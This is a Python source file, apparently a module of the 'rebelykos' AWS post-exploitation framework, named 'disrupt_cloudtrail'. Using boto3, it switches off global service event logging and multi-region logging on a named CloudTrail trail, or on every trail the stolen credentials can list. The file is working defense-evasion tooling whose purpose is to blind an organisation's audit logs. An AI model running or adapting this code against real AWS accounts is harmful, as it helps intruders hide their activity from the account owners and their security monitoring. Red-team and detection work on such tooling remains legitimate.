import boto3

from rebelykos.core.response import Response as res
from rebelykos.core.teamserver.module import Module


class RLModule(Module):
    def __init__(self):
        super().__init__()
        self.name = "disrupt_cloudtrail"
        self.description = ("Make IncludeGlobalServiceEvents"
                            " and IsMultiRegionTrail False.")
        self.author = "Takahiro Yokoyama"
        self.options["Name"] = {
            "Description": ("Name of the trail to disrupt. if not specified"
                            ", try to disrupt all trails user could list."),
            "Required": False,
            "Value": ""
        }

    def run(self):

        def _disrupt(name):
            result.extend(self._handle_err(client.update_trail,
                                           msg="Successfully disrupt trail!",
                                           Name=name,
                                           IncludeGlobalServiceEvents=False,
                                           IsMultiRegionTrail=False))

        result = []
        client = boto3.client("cloudtrail", **self["profile"])
        trail_name = self["Name"]
        if trail_name:
            _disrupt(trail_name)
        else:
            result.extend(self._handle_err(client.describe_trails,
                                           key="trailList"))
            if result[-1][0] == res.RESULT:
                trails = result[-1][1]
                for trail in trails:
                    _disrupt(trail["Name"])
            else:
                result.append((res.INFO,
                               ("Lack of right to list trails "
                                "but might be able to disrupt trail"
                                " if you specify trail name")))
        return result
